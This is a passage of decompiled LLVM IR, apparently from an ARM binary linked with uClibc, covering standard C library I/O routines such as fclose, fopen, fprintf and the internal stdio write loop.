  %v0_198e0 = phi i32 [ %v0_198d4.pre, %dec_label_pc_1990c.dec_label_pc_198d4_crit_edge ], [ %v2_198c8, %.thread14.thread ]
  %v1_198d4 = inttoptr i32 %v0_198e0 to i32*
  %v2_198d4 = load i32, i32* %v1_198d4, align 4
  %v7_198d8 = icmp eq i32 %v2_198d4, 127
  store i1 %v7_198d8, i1* %cpsr_z.global-to-local, align 1
  %v1_198dc = urem i32 %v2_198d4, 256
  store i32 %v1_198dc, i32* @ip, align 4
  %v1_198e0 = add i32 %v0_198e0, 4
  store i32 %v1_198e0, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_198d4, 128
  br i1 %tmp45, label %dec_label_pc_198fc, label %dec_label_pc_198e8

dec_label_pc_198e8:                               ; preds = %dec_label_pc_198d4
  %v0_198e8 = call i32 @__GI___errno_location()
  store i32 %v0_198e8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_198f4 = inttoptr i32 %v0_198e8 to i32*
  store i32 84, i32* %v2_198f4, align 4
  %v0_19928.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19928

dec_label_pc_198fc:                               ; preds = %dec_label_pc_198d4
  %v2_198fc = icmp eq i32 %v1_198dc, 0
  store i1 %v2_198fc, i1* %cpsr_z.global-to-local, align 1
  %v1_19900 = trunc i32 %v2_198d4 to i8
  %v3_19900 = inttoptr i32 %v2_19900 to i8*
  store i8 %v1_19900, i8* %v3_19900, align 1
  %v0_19904 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19904, label %.dec_label_pc_1991c_crit_edge, label %dec_label_pc_1990c

dec_label_pc_1990c:                               ; preds = %dec_label_pc_198fc
  %v0_1990c = load i32, i32* %lr.global-to-local, align 4
  %v1_1990c = load i32, i32* %r4.global-to-local, align 4
  %v2_1990c = add i32 %v1_1990c, %v0_1990c
  store i32 %v2_1990c, i32* %lr.global-to-local, align 4
  %v0_19910 = load i32, i32* %r0.global-to-local, align 4
  %v1_19910 = add i32 %v0_19910, -1
  store i32 %v1_19910, i32* %r0.global-to-local, align 4
  %v2_19914 = icmp eq i32 %v1_19910, 0
  store i1 %v2_19914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19914, label %dec_label_pc_1991c, label %dec_label_pc_1990c.dec_label_pc_198d4_crit_edge

dec_label_pc_1990c.dec_label_pc_198d4_crit_edge:  ; preds = %dec_label_pc_1990c
  %v0_198d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_198d4

.dec_label_pc_1991c_crit_edge:                    ; preds = %dec_label_pc_198fc
  %v1_19904 = load i32, i32* @ip, align 4
  store i32 %v1_19904, i32* %r2.global-to-local, align 4
  %v0_1991c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1991c

dec_label_pc_1991c:                               ; preds = %dec_label_pc_1990c, %.dec_label_pc_1991c_crit_edge, %.thread14.thread
  %v0_1991c = phi i32 [ %v0_1991c.pre, %.dec_label_pc_1991c_crit_edge ], [ %v2_1990028, %.thread14.thread ], [ %v2_1990c, %dec_label_pc_1990c ]
  %v1_1991c = load i32, i32* @sp, align 4
  %v9_1991c = icmp eq i32 %v0_1991c, %v1_1991c
  store i1 %v9_1991c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1991c, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1991c
  %v1_19920 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_19920, i32* %v1_198c8, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1991c, %bb43
  %v0_19924 = load i32, i32* %r0.global-to-local, align 4
  %v1_19924 = load i32, i32* %r5.global-to-local, align 4
  %v2_19924 = sub i32 %v1_19924, %v0_19924
  store i32 %v2_19924, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19928

dec_label_pc_19928:                               ; preds = %dec_label_pc_198e8, %bb44
  %v0_19928 = phi i32 [ %v0_19928.pre, %dec_label_pc_198e8 ], [ %v2_19924, %bb44 ]
  store i32 %v0_19928, i32* %r0.global-to-local, align 4
  %v2_19930 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19930, i32* %r4.global-to-local, align 4
  ret i32 %v0_19928

; uselistorder directives
  uselistorder i32 %v0_19928, { 1, 0 }
  uselistorder i32 %v1_19910, { 1, 0 }
  uselistorder i32 %v2_1990c, { 0, 2, 1 }
  uselistorder i32 %v1_198dc, { 1, 0 }
  uselistorder i32 %v2_198d4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1990028, { 1, 0 }
  uselistorder i32 %v2_198941, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 1, 4, 0, 2, 6, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 4, 1, 2, 3, 8, 5, 9, 6, 7 }
  uselistorder i32 127, { 6, 0, 4, 1, 3, 5, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19928, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1991c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_198d4, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19938 = load i32, i32* @r4, align 4
  store i32 %v3_19938, i32* %stack_var_-36, align 4
  %v6_19938 = load i32, i32* @r5, align 4
  %v9_19938 = load i32, i32* @r6, align 4
  %v12_19938 = load i32, i32* @r7, align 4
  %v15_19938 = load i32, i32* @r8, align 4
  %v27_19938 = load i32, i32* @lr, align 4
  %v2_1993c = add i32 %tmp, 52
  %v3_1993c = inttoptr i32 %v2_1993c to i32*
  %v4_1993c = load i32, i32* %v3_1993c, align 4
  %v1_19944 = sub i32 1, %v4_1993c
  %v2_19944 = icmp ult i32 %v4_1993c, 2
  br i1 %v2_19944, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_19944, %entry ]
  %v0_1994c = phi i32 [ 0, %bb ], [ %v1_19944, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_1994c = icmp eq i32 %v0_1994c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  br i1 %v2_1994c, label %dec_label_pc_19998, label %dec_label_pc_19960

dec_label_pc_19960:                               ; preds = %thread-pre-split
  %v4_19978 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_19978)
  %v0_1998c = load i32, i32* @r6, align 4
  %v2_1998c = add i32 %v0_1998c, 20
  %v3_1998c = inttoptr i32 %v2_1998c to i32*
  %v4_1998c = load i32, i32* %v3_1998c, align 4
  call void @__pseudo_branch(i32 %v4_1998c)
  %v0_19998.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19998

dec_label_pc_19998:                               ; preds = %thread-pre-split, %dec_label_pc_19960
  %v1_199a0 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_19998.pre, %dec_label_pc_19960 ]
  %v1_19998 = inttoptr i32 %v1_199a0 to i16*
  %v2_19998 = load i16, i16* %v1_19998, align 2
  %v3_19998 = zext i16 %v2_19998 to i32
  %v1_1999c = and i32 %v3_19998, 64
  %v2_1999c = icmp eq i32 %v1_1999c, 0
  br i1 %v2_1999c, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_19998
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_19998, %bb17
  %storemerge24 = phi i32 [ %v1_199a0, %bb17 ], [ %v1_1999c, %dec_label_pc_19998 ]
  %v1_199a4 = xor i1 %v2_1999c, true
  call void @__pseudo_cond_branch(i1 %v1_199a4, i32 ptrtoint (i32* @global_var_1ae14.1123 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_199ac = load i32, i32* @r5, align 4
  %v1_199ac = add i32 %v0_199ac, 4
  %v2_199ac = inttoptr i32 %v1_199ac to i32*
  %v3_199ac = load i32, i32* %v2_199ac, align 4
  %v1_199b0 = call i32 @__GI_close(i32 %v3_199ac)
  %v0_199b8 = load i32, i32* @r6, align 4
  %v2_199c4 = add i32 %v0_199b8, 120
  %v3_199c4 = inttoptr i32 %v2_199c4 to i32*
  %v4_199c4 = load i32, i32* %v3_199c4, align 4
  store i32 %v4_199c4, i32* @r7, align 4
  %v1_199cc = load i32, i32* @r5, align 4
  %v2_199cc = add i32 %v1_199cc, 4
  %v3_199cc = inttoptr i32 %v2_199cc to i32*
  store i32 -1, i32* %v3_199cc, align 4
  %v0_199d4 = load i32, i32* @r6, align 4
  %v2_199d4 = add i32 %v0_199d4, 80
  %v3_199d4 = inttoptr i32 %v2_199d4 to i32*
  %v4_199d4 = load i32, i32* %v3_199d4, align 4
  %v1_199dc = icmp slt i32 %v1_199b0, 0
  store i32 %v4_199d4, i32* %stack_var_-80, align 4
  br i1 %v1_199dc, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_199d4)
  %v0_19a04 = load i32, i32* @r6, align 4
  %v2_19a04 = add i32 %v0_19a04, 20
  %v3_19a04 = inttoptr i32 %v2_19a04 to i32*
  %v4_19a04 = load i32, i32* %v3_19a04, align 4
  call void @__pseudo_branch(i32 %v4_19a04)
  %v0_19a14 = load i32, i32* @r6, align 4
  %v2_19a14 = add i32 %v0_19a14, 12
  %v3_19a14 = inttoptr i32 %v2_19a14 to i32*
  %v4_19a14 = load i32, i32* %v3_19a14, align 4
  %v1_19a18 = inttoptr i32 %v4_19a14 to i32*
  %v2_19a18 = load i32, i32* %v1_19a18, align 4
  %v1_19a20 = add i32 %v2_19a18, 1
  %v2_19a24 = add i32 %v0_19a14, 28
  %v3_19a24 = inttoptr i32 %v2_19a24 to i32*
  %v4_19a24 = load i32, i32* %v3_19a24, align 4
  store i32 %v4_19a24, i32* @r4, align 4
  store i32 %v1_19a20, i32* %v1_19a18, align 4
  call void @__pseudo_branch(i32 %v4_19a24)
  %v0_19a3c = load i32, i32* @r5, align 4
  %v1_19a3c = inttoptr i32 %v0_19a3c to i16*
  %v2_19a3c = load i16, i16* %v1_19a3c, align 2
  %v1_19a40 = and i16 %v2_19a3c, 24576
  %v1_19a44 = or i16 %v1_19a40, 48
  %v0_19a48 = load i32, i32* %sb.global-to-local, align 4
  %v2_19a48 = icmp eq i32 %v0_19a48, 0
  store i16 %v1_19a44, i16* %v1_19a3c, align 2
  br i1 %v2_19a48, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_19a5c = xor i1 %v2_19a48, true
  call void @__pseudo_cond_branch(i1 %v2_19a5c, i32 %v4_19a24)
  %v0_19a60 = load i32, i32* @r5, align 4
  %v1_19a60 = inttoptr i32 %v0_19a60 to i16*
  %v2_19a60 = load i16, i16* %v1_19a60, align 2
  %v1_19a64 = and i16 %v2_19a60, 16384
  %v2_19a64 = icmp eq i16 %v1_19a64, 0
  br i1 %v2_19a64, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_19a6c = xor i1 %v2_19a64, true
  call void @__pseudo_cond_branch(i1 %v1_19a6c, i32 ptrtoint (i32* @global_var_17268.1116 to i32))
  %v2_19a78 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_19a78)
  call void @__pseudo_branch(i32 %v4_19a04)
  %v0_19a98 = load i32, i32* @r6, align 4
  %v2_19a98 = add i32 %v0_19a98, 56
  %v3_19a98 = inttoptr i32 %v2_19a98 to i32*
  %v4_19a98 = load i32, i32* %v3_19a98, align 4
  %v1_19a9c = inttoptr i32 %v4_19a98 to i32*
  %v2_19a9c = load i32, i32* %v1_19a9c, align 4
  %v1_19aa0 = add i32 %v2_19a9c, 1
  store i32 %v1_19aa0, i32* %v1_19a9c, align 4
  call void @__pseudo_branch(i32 %v4_19a24)
  %v0_19ab8 = call i32 @_stdio_openlist_dec_use()
  %v0_19abc = load i32, i32* %sl.global-to-local, align 4
  %v2_19ac4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19ac4, i32* @r4, align 4
  store i32 %v6_19938, i32* @r5, align 4
  store i32 %v9_19938, i32* @r6, align 4
  store i32 %v12_19938, i32* @r7, align 4
  store i32 %v15_19938, i32* @r8, align 4
  store i32 %v27_19938, i32* @lr, align 4
  ret i32 %v0_19abc

; uselistorder directives
  uselistorder i1 %v2_19a64, { 1, 0 }
  uselistorder i32 %v4_19a24, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19944, { 1, 0 }
  uselistorder i32 %v4_1993c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_19998, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_19ad0(i32 %arg1) local_unnamed_addr {
dec_label_pc_19ad0:
  %v0_19ad0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19ad0, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_19ad0
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_19ad0, %bb
  %v10_19ae8 = phi i32 [ %arg1, %dec_label_pc_19ad0 ], [ 0, %bb ]
  ret i32 %v10_19ae8

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_19afc = call i32 @_stdio_fopen()
  ret i32 %v0_19afc
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_19b18 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_19b18, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19b28 = call i32 @__GI_vfprintf()
  ret i32 %v0_19b28

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_19b3c = load i32, i32* @r4, align 4
  store i32 %v3_19b3c, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_19b542 = icmp eq i32 %arg3, 0
  store i1 %v2_19b542, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b542, label %dec_label_pc_19be4, label %dec_label_pc_19b5c

dec_label_pc_19b54thread-pre-split:               ; preds = %dec_label_pc_19b5c
  %v3_19b74 = load i32, i32* %r6.global-to-local, align 4
  %v5_19b74 = add i32 %v3_19b74, %v3_19b6c
  store i32 %v5_19b74, i32* %r6.global-to-local, align 4
  %v4_19b78 = load i32, i32* %r5.global-to-local, align 4
  %v5_19b78 = sub i32 %v4_19b78, %v3_19b6c
  store i32 %v5_19b78, i32* %r5.global-to-local, align 4
  %v2_19b54 = icmp eq i32 %v5_19b78, 0
  store i1 %v2_19b54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b54, label %dec_label_pc_19b54.dec_label_pc_19be4.loopexit_crit_edge, label %dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge

dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge: ; preds = %dec_label_pc_19b54thread-pre-split
  %v3_19b5c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_19b68.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19b5c

dec_label_pc_19b5c:                               ; preds = %entry, %dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge
  %v0_19b68 = phi i32 [ %v0_19b68.pre, %dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge ], [ %tmp, %entry ]
  %v0_19b64 = phi i32 [ %v5_19b74, %dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge ], [ %arg2, %entry ]
  %v3_19b5c = phi i32 [ %v3_19b5c.pre, %dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge ], [ 2147483647, %entry ]
  %v0_19b60.in = phi i32 [ %v5_19b78, %dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge ], [ %arg3, %entry ]
  %v3_19b60 = phi i32 [ %v5_19b78, %dec_label_pc_19b54thread-pre-split.dec_label_pc_19b5c_crit_edge ], [ %arg3, %entry ]
  %v0_19b60 = icmp slt i32 %v0_19b60.in, 0
  %storemerge = select i1 %v0_19b60, i32 %v3_19b5c, i32 %v3_19b60
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_19b64, i32* %r1.global-to-local, align 4
  %v1_19b68 = add i32 %v0_19b68, 4
  %v2_19b68 = inttoptr i32 %v1_19b68 to i32*
  %v3_19b68 = load i32, i32* %v2_19b68, align 4
  %v3_19b6c = call i32 @__GI_write(i32 %v3_19b68, i32 %v0_19b64)
  %v1_19b70 = icmp slt i32 %v3_19b6c, 0
  %v2_19b70 = icmp eq i32 %v3_19b6c, 0
  store i1 %v2_19b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19b70, label %dec_label_pc_19b80, label %dec_label_pc_19b54thread-pre-split

dec_label_pc_19b80:                               ; preds = %dec_label_pc_19b5c
  %v0_19b80 = load i32, i32* %r4.global-to-local, align 4
  %v1_19b80 = inttoptr i32 %v0_19b80 to i16*
  %v2_19b80 = load i16, i16* %v1_19b80, align 2
  %v3_19b80 = zext i16 %v2_19b80 to i32
  store i32 %v3_19b80, i32* %r3.global-to-local, align 4
  %v1_19b84 = add i32 %v0_19b80, 8
  store i32 %v1_19b84, i32* %r1.global-to-local, align 4
  %v1_19b88 = inttoptr i32 %v1_19b84 to i32*
  %v2_19b88 = load i32, i32* %v1_19b88, align 4
  store i32 %v2_19b88, i32* %r1.global-to-local, align 4
  %v3_19b88 = add i32 %v0_19b80, 12
  %v4_19b88 = inttoptr i32 %v3_19b88 to i32*
  %v5_19b88 = load i32, i32* %v4_19b88, align 4
  %v1_19b8c = or i32 %v3_19b80, 8
  store i32 %v1_19b8c, i32* %r3.global-to-local, align 4
  %v2_19b90 = sub i32 %v5_19b88, %v2_19b88
  store i32 %v2_19b90, i32* %r2.global-to-local, align 4
  %v9_19b90 = icmp eq i32 %v5_19b88, %v2_19b88
  store i1 %v9_19b90, i1* %cpsr_z.global-to-local, align 1
  %v1_19b94 = trunc i32 %v1_19b8c to i16
  store i16 %v1_19b94, i16* %v1_19b80, align 2
  br i1 %v9_19b90, label %dec_label_pc_19b80.dec_label_pc_19be0_crit_edge, label %dec_label_pc_19b9c

dec_label_pc_19b80.dec_label_pc_19be0_crit_edge:  ; preds = %dec_label_pc_19b80
  %v0_19be0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19be0

dec_label_pc_19b9c:                               ; preds = %dec_label_pc_19b80
  %v0_19b9c = load i32, i32* %r2.global-to-local, align 4
  %v1_19b9c = load i32, i32* %r5.global-to-local, align 4
  %v3_19b9c = icmp ult i32 %v0_19b9c, %v1_19b9c
  %v9_19b9c = icmp eq i32 %v0_19b9c, %v1_19b9c
  store i1 %v9_19b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19b9c, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_19b9c
  store i32 %v1_19b9c, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19b9c, %bb23
  %v2_19bb0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_19bc4
  %v2_19bb0 = phi i32 [ %v2_19bb0.pre, %.preheader ], [ %v1_19bc8, %dec_label_pc_19bc4 ]
  %v0_19ba4 = load i32, i32* %r6.global-to-local, align 4
  %v1_19ba4 = inttoptr i32 %v0_19ba4 to i8*
  %v2_19ba4 = load i8, i8* %v1_19ba4, align 1
  %v3_19ba4 = zext i8 %v2_19ba4 to i32
  store i32 %v3_19ba4, i32* %r3.global-to-local, align 4
  %v7_19ba8 = icmp eq i8 %v2_19ba4, 10
  store i1 %v7_19ba8, i1* %cpsr_z.global-to-local, align 1
  %v1_19bac = add i32 %v0_19ba4, 1
  store i32 %v1_19bac, i32* %r6.global-to-local, align 4
  %v3_19bb0 = inttoptr i32 %v2_19bb0 to i8*
  store i8 %v2_19ba4, i8* %v3_19bb0, align 1
  %v0_19bb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19bb4, label %dec_label_pc_19bb8, label %dec_label_pc_19bc4

dec_label_pc_19bb8:                               ; preds = %bb24
  %v0_19bb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_19bb8 = inttoptr i32 %v0_19bb8 to i16*
  %v2_19bb8 = load i16, i16* %v1_19bb8, align 2
  %v3_19bb8 = zext i16 %v2_19bb8 to i32
  store i32 %v3_19bb8, i32* %r3.global-to-local, align 4
  %v1_19bbc = and i32 %v3_19bb8, 256
  %v2_19bbc = icmp eq i32 %v1_19bbc, 0
  store i1 %v2_19bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19bbc, label %dec_label_pc_19bc4, label %dec_label_pc_19bb8.dec_label_pc_19bd0_crit_edge

dec_label_pc_19bb8.dec_label_pc_19bd0_crit_edge:  ; preds = %dec_label_pc_19bb8
  %v0_19bd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19bd0

dec_label_pc_19bc4:                               ; preds = %dec_label_pc_19bb8, %bb24
  %v0_19bc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_19bc4 = add i32 %v0_19bc4, -1
  store i32 %v1_19bc4, i32* %r2.global-to-local, align 4
  %v7_19bc4 = icmp eq i32 %v0_19bc4, 1
  store i1 %v7_19bc4, i1* %cpsr_z.global-to-local, align 1
  %v0_19bc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_19bc8 = add i32 %v0_19bc8, 1
  store i32 %v1_19bc8, i32* %r1.global-to-local, align 4
  br i1 %v7_19bc4, label %dec_label_pc_19bc4.dec_label_pc_19bd0_crit_edge, label %bb24

dec_label_pc_19bc4.dec_label_pc_19bd0_crit_edge:  ; preds = %dec_label_pc_19bc4
  %v0_19bd0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19bd0

dec_label_pc_19bd0:                               ; preds = %dec_label_pc_19bb8.dec_label_pc_19bd0_crit_edge, %dec_label_pc_19bc4.dec_label_pc_19bd0_crit_edge
  %v0_19bd4 = phi i32 [ %v1_19bc8, %dec_label_pc_19bc4.dec_label_pc_19bd0_crit_edge ], [ %v0_19bd4.pre, %dec_label_pc_19bb8.dec_label_pc_19bd0_crit_edge ]
  %v0_19bd0 = phi i32 [ %v0_19bd0.pre, %dec_label_pc_19bc4.dec_label_pc_19bd0_crit_edge ], [ %v0_19bb8, %dec_label_pc_19bb8.dec_label_pc_19bd0_crit_edge ]
  %v1_19bd0 = add i32 %v0_19bd0, 8
  %v2_19bd0 = inttoptr i32 %v1_19bd0 to i32*
  %v3_19bd0 = load i32, i32* %v2_19bd0, align 4
  store i32 %v3_19bd0, i32* %r3.global-to-local, align 4
  %v2_19bd4 = add i32 %v0_19bd0, 16
  %v3_19bd4 = inttoptr i32 %v2_19bd4 to i32*
  store i32 %v0_19bd4, i32* %v3_19bd4, align 4
  %v0_19bd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19bd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_19bd8 = sub i32 %v1_19bd8, %v0_19bd8
  store i32 %v2_19bd8, i32* %r3.global-to-local, align 4
  %v1_19bdc = load i32, i32* %r5.global-to-local, align 4
  %v2_19bdc = sub i32 %v1_19bdc, %v2_19bd8
  store i32 %v2_19bdc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19be0

dec_label_pc_19be0:                               ; preds = %dec_label_pc_19b80.dec_label_pc_19be0_crit_edge, %dec_label_pc_19bd0
  %v0_19be0 = phi i32 [ %v0_19be0.pre, %dec_label_pc_19b80.dec_label_pc_19be0_crit_edge ], [ %v2_19bdc, %dec_label_pc_19bd0 ]
  %v1_19be0 = load i32, i32* @r7, align 4
  %v2_19be0 = sub i32 %v1_19be0, %v0_19be0
  br label %dec_label_pc_19be4

dec_label_pc_19b54.dec_label_pc_19be4.loopexit_crit_edge: ; preds = %dec_label_pc_19b54thread-pre-split
  %v0_19be4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19be4

dec_label_pc_19be4:                               ; preds = %entry, %dec_label_pc_19b54.dec_label_pc_19be4.loopexit_crit_edge, %dec_label_pc_19be0
  %v0_19be4 = phi i32 [ %v2_19be0, %dec_label_pc_19be0 ], [ %v0_19be4.pre.pre, %dec_label_pc_19b54.dec_label_pc_19be4.loopexit_crit_edge ], [ 0, %entry ]
  %v2_19be8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19be8, i32* %r4.global-to-local, align 4
  ret i32 %v0_19be4

; uselistorder directives
  uselistorder i32 %v0_19bd0, { 1, 0 }
  uselistorder i32 %v1_19bc8, { 0, 2, 1 }
  uselistorder i32 %v0_19bc4, { 1, 0 }
  uselistorder i32 %v1_19b9c, { 0, 2, 1 }
  uselistorder i32 %v0_19b9c, { 1, 0 }
  uselistorder i32 %v5_19b88, { 1, 0 }
  uselistorder i32 %v2_19b88, { 1, 0, 2 }
  uselistorder i32 %v3_19b6c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_19b64, { 1, 0 }
  uselistorder i32 %v5_19b78, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 4, 5, 2, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19be4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19be0, { 1, 0 }
  uselistorder label %dec_label_pc_19bd0, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19b5c, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19bf0 = load i32, i32* @r4, align 4
  store i32 %v3_19bf0, i32* %stack_var_-36, align 4
  %v6_19bf0 = load i32, i32* @r5, align 4
  %v9_19bf0 = load i32, i32* @r6, align 4
  %v18_19bf0 = load i32, i32* @sb, align 4
  %v24_19bf0 = load i32, i32* @fp, align 4
  %v0_19bf4 = load i32, i32* @r1, align 4
  %v1_19bf4 = inttoptr i32 %v0_19bf4 to i8*
  %v2_19bf4 = load i8, i8* %v1_19bf4, align 1
  %v3_19bf4 = zext i8 %v2_19bf4 to i32
  store i32 %v3_19bf4, i32* @ip, align 4
  %v7_19bfc = icmp eq i8 %v2_19bf4, 114
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @fp, align 4
  %v2_19c04 = ptrtoint i32* %stack_var_-72 to i32
  %v0_19c08 = load i32, i32* @r0, align 4
